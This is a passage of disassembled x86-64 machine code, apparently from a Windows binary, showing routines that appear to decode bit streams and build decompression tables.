   14000244b:	2b de                	sub    %esi,%ebx
   14000244d:	8d 14 da             	lea    (%rdx,%rbx,8),%edx
   140002450:	49 8b d8             	mov    %r8,%rbx
   140002453:	83 e2 1f             	and    $0x1f,%edx
   140002456:	8b ca                	mov    %edx,%ecx
   140002458:	44 8b 03             	mov    (%rbx),%r8d
   14000245b:	41 d3 e8             	shr    %cl,%r8d
   14000245e:	eb 1a                	jmp    0x14000247a
   140002460:	48 63 c2             	movslq %edx,%rax
   140002463:	83 e2 07             	and    $0x7,%edx
   140002466:	48 c1 f8 03          	sar    $0x3,%rax
   14000246a:	8b ca                	mov    %edx,%ecx
   14000246c:	48 03 d8             	add    %rax,%rbx
   14000246f:	44 8b 03             	mov    (%rbx),%r8d
   140002472:	41 d3 e8             	shr    %cl,%r8d
   140002475:	eb 03                	jmp    0x14000247a
   140002477:	45 33 ff             	xor    %r15d,%r15d
   14000247a:	47 8d 0c 36          	lea    (%r14,%r14,1),%r9d
   14000247e:	41 03 d5             	add    %r13d,%edx
   140002481:	45 8b d1             	mov    %r9d,%r10d
   140002484:	41 8d 4e ff          	lea    -0x1(%r14),%ecx
   140002488:	45 2b d3             	sub    %r11d,%r10d
   14000248b:	41 23 c8             	and    %r8d,%ecx
   14000248e:	41 ff ca             	dec    %r10d
   140002491:	41 3b ca             	cmp    %r10d,%ecx
   140002494:	73 04                	jae    0x14000249a
   140002496:	ff ca                	dec    %edx
   140002498:	eb 12                	jmp    0x1400024ac
   14000249a:	41 8d 41 ff          	lea    -0x1(%r9),%eax
   14000249e:	41 23 c0             	and    %r8d,%eax
   1400024a1:	8b c8                	mov    %eax,%ecx
   1400024a3:	41 2b ca             	sub    %r10d,%ecx
   1400024a6:	41 3b c6             	cmp    %r14d,%eax
   1400024a9:	0f 4c c8             	cmovl  %eax,%ecx
   1400024ac:	4c 8b 44 24 30       	mov    0x30(%rsp),%r8
   1400024b1:	ff c9                	dec    %ecx
   1400024b3:	42 8d 04 19          	lea    (%rcx,%r11,1),%eax
   1400024b7:	66 41 89 0c 78       	mov    %cx,(%r8,%rdi,2)
   1400024bc:	44 2b d9             	sub    %ecx,%r11d
   1400024bf:	85 c9                	test   %ecx,%ecx
   1400024c1:	44 0f 48 d8          	cmovs  %eax,%r11d
   1400024c5:	ff c7                	inc    %edi
   1400024c7:	85 c9                	test   %ecx,%ecx
   1400024c9:	41 0f 94 c7          	sete   %r15b
   1400024cd:	45 3b de             	cmp    %r14d,%r11d
   1400024d0:	7d 27                	jge    0x1400024f9
   1400024d2:	41 83 fb 01          	cmp    $0x1,%r11d
   1400024d6:	7e 75                	jle    0x14000254d
   1400024d8:	41 0f bd c3          	bsr    %r11d,%eax
   1400024dc:	b9 00 00 00 00       	mov    $0x0,%ecx
   1400024e1:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%rsp)
   1400024e8:	00 
   1400024e9:	41 be 01 00 00 00    	mov    $0x1,%r14d
   1400024ef:	0f 45 c8             	cmovne %eax,%ecx
   1400024f2:	41 d3 e6             	shl    %cl,%r14d
   1400024f5:	44 8d 69 01          	lea    0x1(%rcx),%r13d
   1400024f9:	41 3b fc             	cmp    %r12d,%edi
   1400024fc:	73 4b                	jae    0x140002549
   1400024fe:	48 3b dd             	cmp    %rbp,%rbx
   140002501:	76 2c                	jbe    0x14000252f
   140002503:	8b c2                	mov    %edx,%eax
   140002505:	4c 8d 46 fc          	lea    -0x4(%rsi),%r8
   140002509:	c1 f8 03             	sar    $0x3,%eax
   14000250c:	48 63 c8             	movslq %eax,%rcx
   14000250f:	48 03 cb             	add    %rbx,%rcx
   140002512:	49 3b c8             	cmp    %r8,%rcx
   140002515:	76 18                	jbe    0x14000252f
   140002517:	2b de                	sub    %esi,%ebx
   140002519:	8d 14 da             	lea    (%rdx,%rbx,8),%edx
   14000251c:	49 8b d8             	mov    %r8,%rbx
   14000251f:	83 e2 1f             	and    $0x1f,%edx
   140002522:	8b ca                	mov    %edx,%ecx
   140002524:	44 8b 03             	mov    (%rbx),%r8d
   140002527:	41 d3 e8             	shr    %cl,%r8d
   14000252a:	e9 7a fe ff ff       	jmp    0x1400023a9
   14000252f:	48 63 c2             	movslq %edx,%rax
   140002532:	83 e2 07             	and    $0x7,%edx
   140002535:	48 c1 f8 03          	sar    $0x3,%rax
   140002539:	8b ca                	mov    %edx,%ecx
   14000253b:	48 03 d8             	add    %rax,%rbx
   14000253e:	44 8b 03             	mov    (%rbx),%r8d
   140002541:	41 d3 e8             	shr    %cl,%r8d
   140002544:	e9 60 fe ff ff       	jmp    0x1400023a9
   140002549:	41 83 fb 01          	cmp    $0x1,%r11d
   14000254d:	74 09                	je     0x140002558
   14000254f:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   140002556:	eb 2d                	jmp    0x140002585
   140002558:	41 3b fc             	cmp    %r12d,%edi
   14000255b:	76 09                	jbe    0x140002566
   14000255d:	48 c7 c0 d0 ff ff ff 	mov    $0xffffffffffffffd0,%rax
   140002564:	eb 1f                	jmp    0x140002585
   140002566:	83 fa 20             	cmp    $0x20,%edx
   140002569:	7f e4                	jg     0x14000254f
   14000256b:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140002570:	8d 47 ff             	lea    -0x1(%rdi),%eax
   140002573:	89 01                	mov    %eax,(%rcx)
   140002575:	8d 42 07             	lea    0x7(%rdx),%eax
   140002578:	c1 f8 03             	sar    $0x3,%eax
   14000257b:	48 98                	cltq
   14000257d:	48 2b 44 24 40       	sub    0x40(%rsp),%rax
   140002582:	48 03 c3             	add    %rbx,%rax
   140002585:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   14000258a:	48 33 cc             	xor    %rsp,%rcx
   14000258d:	e8 2e a0 00 00       	call   0x14000c5c0
   140002592:	48 83 c4 68          	add    $0x68,%rsp
   140002596:	41 5f                	pop    %r15
   140002598:	41 5e                	pop    %r14
   14000259a:	41 5d                	pop    %r13
   14000259c:	41 5c                	pop    %r12
   14000259e:	5f                   	pop    %rdi
   14000259f:	5e                   	pop    %rsi
   1400025a0:	5d                   	pop    %rbp
   1400025a1:	5b                   	pop    %rbx
   1400025a2:	c3                   	ret
   1400025a3:	cc                   	int3
   1400025a4:	cc                   	int3
   1400025a5:	cc                   	int3
   1400025a6:	cc                   	int3
   1400025a7:	cc                   	int3
   1400025a8:	cc                   	int3
   1400025a9:	cc                   	int3
   1400025aa:	cc                   	int3
   1400025ab:	cc                   	int3
   1400025ac:	cc                   	int3
   1400025ad:	cc                   	int3
   1400025ae:	cc                   	int3
   1400025af:	cc                   	int3
   1400025b0:	40 53                	rex push %rbx
   1400025b2:	57                   	push   %rdi
   1400025b3:	41 56                	push   %r14
   1400025b5:	48 83 ec 40          	sub    $0x40,%rsp
   1400025b9:	48 8b 94 24 90 00 00 	mov    0x90(%rsp),%rdx
   1400025c0:	00 
   1400025c1:	4d 8b f1             	mov    %r9,%r14
   1400025c4:	49 8b f8             	mov    %r8,%rdi
   1400025c7:	48 8b d9             	mov    %rcx,%rbx
   1400025ca:	48 85 d2             	test   %rdx,%rdx
   1400025cd:	75 10                	jne    0x1400025df
   1400025cf:	48 c7 c0 b8 ff ff ff 	mov    $0xffffffffffffffb8,%rax
   1400025d6:	48 83 c4 40          	add    $0x40,%rsp
   1400025da:	41 5e                	pop    %r14
   1400025dc:	5f                   	pop    %rdi
   1400025dd:	5b                   	pop    %rbx
   1400025de:	c3                   	ret
   1400025df:	4c 8b 84 24 88 00 00 	mov    0x88(%rsp),%r8
   1400025e6:	00 
   1400025e7:	48 89 6c 24 60       	mov    %rbp,0x60(%rsp)
   1400025ec:	33 ed                	xor    %ebp,%ebp
   1400025ee:	48 89 74 24 70       	mov    %rsi,0x70(%rsp)
   1400025f3:	41 0f b6 30          	movzbl (%r8),%esi
   1400025f7:	48 81 fe 80 00 00 00 	cmp    $0x80,%rsi
   1400025fe:	72 61                	jb     0x140002661
   140002600:	48 8d 46 81          	lea    -0x7f(%rsi),%rax
   140002604:	48 8d 70 01          	lea    0x1(%rax),%rsi
   140002608:	48 d1 ee             	shr    $1,%rsi
   14000260b:	48 8d 4e 01          	lea    0x1(%rsi),%rcx
   14000260f:	48 3b ca             	cmp    %rdx,%rcx
   140002612:	77 56                	ja     0x14000266a
   140002614:	48 3d 00 01 00 00    	cmp    $0x100,%rax
   14000261a:	0f 83 32 01 00 00    	jae    0x140002752
   140002620:	4d 8d 50 01          	lea    0x1(%r8),%r10
   140002624:	44 8b cd             	mov    %ebp,%r9d
   140002627:	48 85 c0             	test   %rax,%rax
   14000262a:	74 6c                	je     0x140002698
   14000262c:	44 8b c5             	mov    %ebp,%r8d
   14000262f:	90                   	nop
   140002630:	49 8b d0             	mov    %r8,%rdx
   140002633:	48 d1 ea             	shr    $1,%rdx
   140002636:	42 0f b6 0c 12       	movzbl (%rdx,%r10,1),%ecx
   14000263b:	c0 e9 04             	shr    $0x4,%cl
   14000263e:	41 88 0c 18          	mov    %cl,(%r8,%rbx,1)
   140002642:	41 8d 49 01          	lea    0x1(%r9),%ecx
   140002646:	46 0f b6 04 12       	movzbl (%rdx,%r10,1),%r8d
   14000264b:	41 83 c1 02          	add    $0x2,%r9d
   14000264f:	41 80 e0 0f          	and    $0xf,%r8b
   140002653:	44 88 04 19          	mov    %r8b,(%rcx,%rbx,1)
   140002657:	45 8b c1             	mov    %r9d,%r8d
   14000265a:	4c 3b c0             	cmp    %rax,%r8
   14000265d:	72 d1                	jb     0x140002630
   14000265f:	eb 37                	jmp    0x140002698
   140002661:	48 8d 46 01          	lea    0x1(%rsi),%rax
   140002665:	48 3b c2             	cmp    %rdx,%rax
   140002668:	76 0c                	jbe    0x140002676
   14000266a:	48 c7 c0 b8 ff ff ff 	mov    $0xffffffffffffffb8,%rax
   140002671:	e9 e3 00 00 00       	jmp    0x140002759
   140002676:	48 8b 84 24 98 00 00 	mov    0x98(%rsp),%rax
   14000267d:	00 
   14000267e:	49 ff c0             	inc    %r8
   140002681:	4c 8b ce             	mov    %rsi,%r9
   140002684:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140002689:	e8 72 ef ff ff       	call   0x140001600
   14000268e:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   140002692:	0f 87 c1 00 00 00    	ja     0x140002759
   140002698:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000269b:	33 c9                	xor    %ecx,%ecx
   14000269d:	44 8b cd             	mov    %ebp,%r9d
   1400026a0:	44 8b c5             	mov    %ebp,%r8d
   1400026a3:	0f 11 07             	movups %xmm0,(%rdi)
   1400026a6:	0f 11 47 10          	movups %xmm0,0x10(%rdi)
   1400026aa:	0f 11 47 20          	movups %xmm0,0x20(%rdi)
   1400026ae:	89 4f 30             	mov    %ecx,0x30(%rdi)
   1400026b1:	48 85 c0             	test   %rax,%rax
   1400026b4:	0f 84 98 00 00 00    	je     0x140002752
   1400026ba:	41 ba 01 00 00 00    	mov    $0x1,%r10d
   1400026c0:	0f b6 14 19          	movzbl (%rcx,%rbx,1),%edx
   1400026c4:	80 fa 0c             	cmp    $0xc,%dl
   1400026c7:	0f 83 85 00 00 00    	jae    0x140002752
   1400026cd:	ff 04 97             	incl   (%rdi,%rdx,4)
   1400026d0:	41 ff c0             	inc    %r8d
   1400026d3:	0f b6 0c 19          	movzbl (%rcx,%rbx,1),%ecx
   1400026d7:	41 8b d2             	mov    %r10d,%edx
   1400026da:	d3 e2                	shl    %cl,%edx
   1400026dc:	d1 fa                	sar    $1,%edx
   1400026de:	44 03 ca             	add    %edx,%r9d
   1400026e1:	41 8b c8             	mov    %r8d,%ecx
   1400026e4:	48 3b c8             	cmp    %rax,%rcx
   1400026e7:	72 d7                	jb     0x1400026c0
   1400026e9:	45 85 c9             	test   %r9d,%r9d
   1400026ec:	74 64                	je     0x140002752
   1400026ee:	41 0f bd d1          	bsr    %r9d,%edx
   1400026f2:	8b cd                	mov    %ebp,%ecx
   1400026f4:	0f 45 ca             	cmovne %edx,%ecx
   1400026f7:	ff c1                	inc    %ecx
   1400026f9:	83 f9 0c             	cmp    $0xc,%ecx
   1400026fc:	77 54                	ja     0x140002752
   1400026fe:	48 8b 94 24 80 00 00 	mov    0x80(%rsp),%rdx
   140002705:	00 
   140002706:	45 8b c2             	mov    %r10d,%r8d
   140002709:	41 d3 e0             	shl    %cl,%r8d
   14000270c:	45 2b c1             	sub    %r9d,%r8d
   14000270f:	44 8b cd             	mov    %ebp,%r9d
   140002712:	89 0a                	mov    %ecx,(%rdx)
   140002714:	41 0f bd d0          	bsr    %r8d,%edx
   140002718:	44 0f 45 ca          	cmovne %edx,%r9d
   14000271c:	41 ff c1             	inc    %r9d
   14000271f:	41 0f bd d0          	bsr    %r8d,%edx
   140002723:	0f 45 ea             	cmovne %edx,%ebp
   140002726:	40 0f b6 cd          	movzbl %bpl,%ecx
   14000272a:	41 d3 e2             	shl    %cl,%r10d
   14000272d:	45 3b d0             	cmp    %r8d,%r10d
   140002730:	75 20                	jne    0x140002752
   140002732:	44 88 0c 18          	mov    %r9b,(%rax,%rbx,1)
   140002736:	42 ff 04 8f          	incl   (%rdi,%r9,4)
   14000273a:	8b 4f 04             	mov    0x4(%rdi),%ecx
   14000273d:	83 f9 02             	cmp    $0x2,%ecx
   140002740:	72 10                	jb     0x140002752
   140002742:	f6 c1 01             	test   $0x1,%cl
   140002745:	75 0b                	jne    0x140002752
   140002747:	ff c0                	inc    %eax
   140002749:	41 89 06             	mov    %eax,(%r14)
   14000274c:	48 8d 46 01          	lea    0x1(%rsi),%rax
   140002750:	eb 07                	jmp    0x140002759
   140002752:	48 c7 c0 ec ff ff ff 	mov    $0xffffffffffffffec,%rax
   140002759:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   14000275e:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140002763:	48 83 c4 40          	add    $0x40,%rsp
   140002767:	41 5e                	pop    %r14
   140002769:	5f                   	pop    %rdi
   14000276a:	5b                   	pop    %rbx
   14000276b:	c3                   	ret
   14000276c:	cc                   	int3
   14000276d:	cc                   	int3
   14000276e:	cc                   	int3
   14000276f:	cc                   	int3
   140002770:	4c 8b dc             	mov    %rsp,%r11
   140002773:	53                   	push   %rbx
   140002774:	57                   	push   %rdi
   140002775:	41 55                	push   %r13
   140002777:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   14000277e:	49 8d 81 80 00 00 00 	lea    0x80(%r9),%rax
   140002785:	41 c7 43 20 00 00 00 	movl   $0x0,0x20(%r11)
   14000278c:	00 
   14000278d:	49 89 43 90          	mov    %rax,-0x70(%r11)
   140002791:	4c 8d 69 04          	lea    0x4(%rcx),%r13
   140002795:	4d 89 43 88          	mov    %r8,-0x78(%r11)
   140002799:	49 8d 43 20          	lea    0x20(%r11),%rax
   14000279d:	49 8b f9             	mov    %r9,%rdi
   1400027a0:	49 89 53 80          	mov    %rdx,-0x80(%r11)
   1400027a4:	48 8b d9             	mov    %rcx,%rbx
   1400027a7:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400027ac:	49 8d 89 e4 02 00 00 	lea    0x2e4(%r9),%rcx
   1400027b3:	41 c7 43 08 00 00 00 	movl   $0x0,0x8(%r11)
   1400027ba:	00 
   1400027bb:	4c 8b c7             	mov    %rdi,%r8
   1400027be:	4d 8d 4b 08          	lea    0x8(%r11),%r9
   1400027c2:	e8 e9 fd ff ff       	call   0x1400025b0
   1400027c7:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1400027cc:	48 83 f8 88          	cmp    $0xffffffffffffff88,%rax
   1400027d0:	0f 87 fc 02 00 00    	ja     0x140002ad2
   1400027d6:	8b 03                	mov    (%rbx),%eax
   1400027d8:	44 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%r9d
   1400027df:	00 
   1400027e0:	0f b6 c8             	movzbl %al,%ecx
   1400027e3:	ff c1                	inc    %ecx
   1400027e5:	89 84 24 d8 00 00 00 	mov    %eax,0xd8(%rsp)
   1400027ec:	44 3b c9             	cmp    %ecx,%r9d
   1400027ef:	76 13                	jbe    0x140002804
   1400027f1:	48 c7 c0 d4 ff ff ff 	mov    $0xffffffffffffffd4,%rax
   1400027f8:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   1400027ff:	41 5d                	pop    %r13
   140002801:	5f                   	pop    %rdi
   140002802:	5b                   	pop    %rbx
   140002803:	c3                   	ret
   140002804:	44 8b 94 24 b0 00 00 	mov    0xb0(%rsp),%r10d
   14000280b:	00 
   14000280c:	33 d2                	xor    %edx,%edx
   14000280e:	48 89 b4 24 88 00 00 	mov    %rsi,0x88(%rsp)
   140002815:	00 
   140002816:	41 8d 71 01          	lea    0x1(%r9),%esi
   14000281a:	c6 84 24 d9 00 00 00 	movb   $0x0,0xd9(%rsp)
   140002821:	00 
   140002822:	44 88 8c 24 da 00 00 	mov    %r9b,0xda(%rsp)
   140002829:	00 
   14000282a:	8b 84 24 d8 00 00 00 	mov    0xd8(%rsp),%eax
   140002831:	45 8d 5a fd          	lea    -0x3(%r10),%r11d
   140002835:	4c 89 a4 24 80 00 00 	mov    %r12,0x80(%rsp)
   14000283c:	00 
   14000283d:	4c 89 7c 24 70       	mov    %r15,0x70(%rsp)
   140002842:	89 03                	mov    %eax,(%rbx)
   140002844:	89 74 24 54          	mov    %esi,0x54(%rsp)
   140002848:	85 f6                	test   %esi,%esi
   14000284a:	7e 25                	jle    0x140002871
   14000284c:	48 8b cf             	mov    %rdi,%rcx
   14000284f:	44 8b c6             	mov    %esi,%r8d
   140002852:	0f 1f 40 00          	nopl   0x0(%rax)
   140002856:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000285d:	00 00 00 
   140002860:	8b c2                	mov    %edx,%eax
   140002862:	03 11                	add    (%rcx),%edx
   140002864:	89 41 40             	mov    %eax,0x40(%rcx)
   140002867:	48 8d 49 04          	lea    0x4(%rcx),%rcx
   14000286b:	49 83 e8 01          	sub    $0x1,%r8
   14000286f:	75 ef                	jne    0x140002860
   140002871:	45 33 c0             	xor    %r8d,%r8d
   140002874:	45 85 db             	test   %r11d,%r11d
   140002877:	0f 8e 91 00 00 00    	jle    0x14000290e
   14000287d:	4c 8d 8f e5 02 00 00 	lea    0x2e5(%rdi),%r9
   140002884:	0f 1f 40 00          	nopl   0x0(%rax)
   140002888:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000288f:	00 
   140002890:	41 0f b6 41 ff       	movzbl -0x1(%r9),%eax
   140002895:	4d 8d 49 04          	lea    0x4(%r9),%r9
   140002899:	48 8d 0c 87          	lea    (%rdi,%rax,4),%rcx
   14000289d:	8b 44 87 40          	mov    0x40(%rdi,%rax,4),%eax
   1400028a1:	44 88 84 38 e4 01 00 	mov    %r8b,0x1e4(%rax,%rdi,1)
   1400028a8:	00 
   1400028a9:	ff 41 40             	incl   0x40(%rcx)
   1400028ac:	41 8d 48 01          	lea    0x1(%r8),%ecx
   1400028b0:	41 0f b6 41 fc       	movzbl -0x4(%r9),%eax
   1400028b5:	48 8d 14 87          	lea    (%rdi,%rax,4),%rdx
   1400028b9:	8b 44 87 40          	mov    0x40(%rdi,%rax,4),%eax
   1400028bd:	88 8c 38 e4 01 00 00 	mov    %cl,0x1e4(%rax,%rdi,1)
   1400028c4:	41 8d 48 02          	lea    0x2(%r8),%ecx
   1400028c8:	ff 42 40             	incl   0x40(%rdx)
   1400028cb:	41 0f b6 41 fd       	movzbl -0x3(%r9),%eax
   1400028d0:	48 8d 14 87          	lea    (%rdi,%rax,4),%rdx
   1400028d4:	8b 44 87 40          	mov    0x40(%rdi,%rax,4),%eax
   1400028d8:	88 8c 38 e4 01 00 00 	mov    %cl,0x1e4(%rax,%rdi,1)
   1400028df:	41 8d 48 03          	lea    0x3(%r8),%ecx
   1400028e3:	ff 42 40             	incl   0x40(%rdx)
   1400028e6:	41 83 c0 04          	add    $0x4,%r8d
   1400028ea:	41 0f b6 41 fe       	movzbl -0x2(%r9),%eax
   1400028ef:	48 8d 14 87          	lea    (%rdi,%rax,4),%rdx
   1400028f3:	8b 44 87 40          	mov    0x40(%rdi,%rax,4),%eax
   1400028f7:	88 8c 38 e4 01 00 00 	mov    %cl,0x1e4(%rax,%rdi,1)
   1400028fe:	ff 42 40             	incl   0x40(%rdx)
   140002901:	45 3b c3             	cmp    %r11d,%r8d
   140002904:	7c 8a                	jl     0x140002890
   140002906:	44 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%r9d
   14000290d:	00 
   14000290e:	45 3b c2             	cmp    %r10d,%r8d
   140002911:	7d 2f                	jge    0x140002942
   140002913:	49 63 d0             	movslq %r8d,%rdx
   140002916:	48 81 c2 e4 02 00 00 	add    $0x2e4,%rdx
   14000291d:	48 03 d7             	add    %rdi,%rdx
   140002920:	0f b6 02             	movzbl (%rdx),%eax
   140002923:	48 8d 52 01          	lea    0x1(%rdx),%rdx
   140002927:	48 8d 0c 87          	lea    (%rdi,%rax,4),%rcx
   14000292b:	8b 44 87 40          	mov    0x40(%rdi,%rax,4),%eax
   14000292f:	44 88 84 38 e4 01 00 	mov    %r8b,0x1e4(%rax,%rdi,1)
   140002936:	00 
   140002937:	41 ff c0             	inc    %r8d
   14000293a:	ff 41 40             	incl   0x40(%rcx)
   14000293d:	45 3b c2             	cmp    %r10d,%r8d
   140002940:	7c de                	jl     0x140002920
   140002942:	44 8b 3f             	mov    (%rdi),%r15d
   140002945:	45 33 c0             	xor    %r8d,%r8d
   140002948:	41 bc 01 00 00 00    	mov    $0x1,%r12d
   14000294e:	44 89 84 24 d0 00 00 	mov    %r8d,0xd0(%rsp)
   140002955:	00 
   140002956:	41 3b f4             	cmp    %r12d,%esi
   140002959:	0f 86 59 01 00 00    	jbe    0x140002ab8
   14000295f:	48 8d 47 04          	lea    0x4(%rdi),%rax
   140002963:	48 89 ac 24 b8 00 00 	mov    %rbp,0xb8(%rsp)
   14000296a:	00 
   14000296b:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140002970:	48 bb 01 00 01 00 01 	movabs $0x1000100010001,%rbx
   140002977:	00 01 00 
   14000297a:	4c 89 74 24 78       	mov    %r14,0x78(%rsp)
   14000297f:	90                   	nop
   140002980:	4c 63 18             	movslq (%rax),%r11
   140002983:	41 8b cc             	mov    %r12d,%ecx
   140002986:	41 be 01 00 00 00    	mov    $0x1,%r14d
   14000298c:	4d 63 d0             	movslq %r8d,%r10
   14000298f:	41 d3 e6             	shl    %cl,%r14d
   140002992:	41 0f b6 c1          	movzbl %r9b,%eax
   140002996:	41 d1 fe             	sar    $1,%r14d
   140002999:	41 2a c4             	sub    %r12b,%al
   14000299c:	fe c0                	inc    %al
   14000299e:	41 8b ce             	mov    %r14d,%ecx
   1400029a1:	0f b6 d0             	movzbl %al,%edx
   1400029a4:	4d 8b c3             	mov    %r11,%r8
   1400029a7:	83 e9 01             	sub    $0x1,%ecx
   1400029aa:	0f 84 39 02 00 00    	je     0x140002be9
   1400029b0:	83 e9 01             	sub    $0x1,%ecx
   1400029b3:	0f 84 d4 01 00 00    	je     0x140002b8d
   1400029b9:	83 e9 02             	sub    $0x2,%ecx
   1400029bc:	0f 84 6f 01 00 00    	je     0x140002b31
   1400029c2:	83 f9 04             	cmp    $0x4,%ecx
   1400029c5:	0f 84 13 01 00 00    	je     0x140002ade
   1400029cb:	49 63 de             	movslq %r14d,%rbx
   1400029ce:	45 85 db             	test   %r11d,%r11d
   1400029d1:	0f 8e 96 00 00 00    	jle    0x140002a6d
   1400029d7:	4d 8d 5d 10          	lea    0x10(%r13),%r11
   1400029db:	8b ea                	mov    %edx,%ebp
   1400029dd:	4f 8d 1c 53          	lea    (%r11,%r10,2),%r11
   1400029e1:	48 c1 e5 08          	shl    $0x8,%rbp
   1400029e5:	4d 63 d7             	movslq %r15d,%r10
   1400029e8:	48 8d 34 1b          	lea    (%rbx,%rbx,1),%rsi
   1400029ec:	45 33 c9             	xor    %r9d,%r9d
   1400029ef:	48 b8 01 00 01 00 01 	movabs $0x1000100010001,%rax
   1400029f6:	00 01 00 
   1400029f9:	4c 03 d7             	add    %rdi,%r10
   1400029fc:	0f 1f 40 00          	nopl   0x0(%rax)
   140002a00:	43 0f b6 8c 11 e4 01 	movzbl 0x1e4(%r9,%r10,1),%ecx
   140002a07:	00 00 
   140002a09:	48 03 cd             	add    %rbp,%rcx
   140002a0c:	48 0f af c8          	imul   %rax,%rcx
   140002a10:	45 85 f6             	test   %r14d,%r14d
   140002a13:	7e 3e                	jle    0x140002a53
   140002a15:	48 8d 53 ff          	lea    -0x1(%rbx),%rdx
   140002a19:	49 8b c3             	mov    %r11,%rax
   140002a1c:	48 c1 ea 04          	shr    $0x4,%rdx
   140002a20:	48 ff c2             	inc    %rdx
   140002a23:	0f 1f 40 00          	nopl   0x0(%rax)
   140002a27:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140002a2e:	00 00 
   140002a30:	48 89 48 f0          	mov    %rcx,-0x10(%rax)
   140002a34:	48 89 48 f8          	mov    %rcx,-0x8(%rax)
   140002a38:	48 89 08             	mov    %rcx,(%rax)
   140002a3b:	48 89 48 08          	mov    %rcx,0x8(%rax)
   140002a3f:	48 8d 40 20          	lea    0x20(%rax),%rax
   140002a43:	48 83 ea 01          	sub    $0x1,%rdx
   140002a47:	75 e7                	jne    0x140002a30
   140002a49:	48 b8 01 00 01 00 01 	movabs $0x1000100010001,%rax
   140002a50:	00 01 00 
   140002a53:	4c 03 de             	add    %rsi,%r11
   140002a56:	49 ff c1             	inc    %r9
   140002a59:	4d 3b c8             	cmp    %r8,%r9
   140002a5c:	7c a2                	jl     0x140002a00
   140002a5e:	8b 74 24 54          	mov    0x54(%rsp),%esi
   140002a62:	45 8b d8             	mov    %r8d,%r11d
   140002a65:	44 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%r9d
   140002a6c:	00 
   140002a6d:	48 bb 01 00 01 00 01 	movabs $0x1000100010001,%rbx
   140002a74:	00 01 00 
   140002a77:	44 8b 84 24 d0 00 00 	mov    0xd0(%rsp),%r8d
   140002a7e:	00 
   140002a7f:	45 03 fb             	add    %r11d,%r15d
   140002a82:	48 8b 44 24 58       	mov    0x58(%rsp),%rax
   140002a87:	41 ff c4             	inc    %r12d
   140002a8a:	45 0f af f3          	imul   %r11d,%r14d
   140002a8e:	48 83 c0 04          	add    $0x4,%rax
   140002a92:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140002a97:	45 03 c6             	add    %r14d,%r8d
   140002a9a:	44 89 84 24 d0 00 00 	mov    %r8d,0xd0(%rsp)
   140002aa1:	00 
   140002aa2:	44 3b e6             	cmp    %esi,%r12d
   140002aa5:	0f 82 d5 fe ff ff    	jb     0x140002980
   140002aab:	4c 8b 74 24 78       	mov    0x78(%rsp),%r14
   140002ab0:	48 8b ac 24 b8 00 00 	mov    0xb8(%rsp),%rbp
   140002ab7:	00 
   140002ab8:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   140002abd:	4c 8b 7c 24 70       	mov    0x70(%rsp),%r15
   140002ac2:	4c 8b a4 24 80 00 00 	mov    0x80(%rsp),%r12
   140002ac9:	00 
   140002aca:	48 8b b4 24 88 00 00 	mov    0x88(%rsp),%rsi
   140002ad1:	00 
   140002ad2:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   140002ad9:	41 5d                	pop    %r13
   140002adb:	5f                   	pop    %rdi
   140002adc:	5b                   	pop    %rbx
   140002add:	c3                   	ret
   140002ade:	45 85 db             	test   %r11d,%r11d
   140002ae1:	7e 94                	jle    0x140002a77
   140002ae3:	4c 8b ca             	mov    %rdx,%r9
   140002ae6:	33 c9                	xor    %ecx,%ecx
   140002ae8:	4a 8d 14 55 00 00 00 	lea    0x0(,%r10,2),%rdx
   140002aef:	00 
   140002af0:	49 c1 e1 08          	shl    $0x8,%r9
   140002af4:	49 03 d5             	add    %r13,%rdx
   140002af7:	4d 63 d7             	movslq %r15d,%r10
   140002afa:	4c 03 d7             	add    %rdi,%r10
   140002afd:	0f 1f 00             	nopl   (%rax)
   140002b00:	42 0f b6 84 11 e4 01 	movzbl 0x1e4(%rcx,%r10,1),%eax
   140002b07:	00 00 
   140002b09:	48 8d 52 10          	lea    0x10(%rdx),%rdx
   140002b0d:	49 03 c1             	add    %r9,%rax
   140002b10:	48 ff c1             	inc    %rcx
   140002b13:	48 0f af c3          	imul   %rbx,%rax
   140002b17:	48 89 42 f0          	mov    %rax,-0x10(%rdx)
   140002b1b:	48 89 42 f8          	mov    %rax,-0x8(%rdx)
   140002b1f:	49 3b c8             	cmp    %r8,%rcx
   140002b22:	7c dc                	jl     0x140002b00
   140002b24:	44 8b 8c 24 c8 00 00 	mov    0xc8(%rsp),%r9d
   140002b2b:	00 
   140002b2c:	e9 46 ff ff ff       	jmp    0x140002a77
   140002b31:	45 85 db             	test   %r11d,%r11d
   140002b34:	0f 8e 3d ff ff ff    	jle    0x140002a77
   140002b3a:	4c 8b ca             	mov    %rdx,%r9
   140002b3d:	33 c9                	xor    %ecx,%ecx
   140002b3f:	4a 8d 14 55 00 00 00 	lea    0x0(,%r10,2),%rdx
   140002b46:	00 
   140002b47:	49 c1 e1 08          	shl    $0x8,%r9
   140002b4b:	49 03 d5             	add    %r13,%rdx
   140002b4e:	4d 63 d7             	movslq %r15d,%r10
   140002b51:	4c 03 d7             	add    %rdi,%r10
   140002b54:	0f 1f 40 00          	nopl   0x0(%rax)
   140002b58:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140002b5f:	00 
   140002b60:	41 0f b6 84 0a e4 01 	movzbl 0x1e4(%r10,%rcx,1),%eax
   140002b67:	00 00 
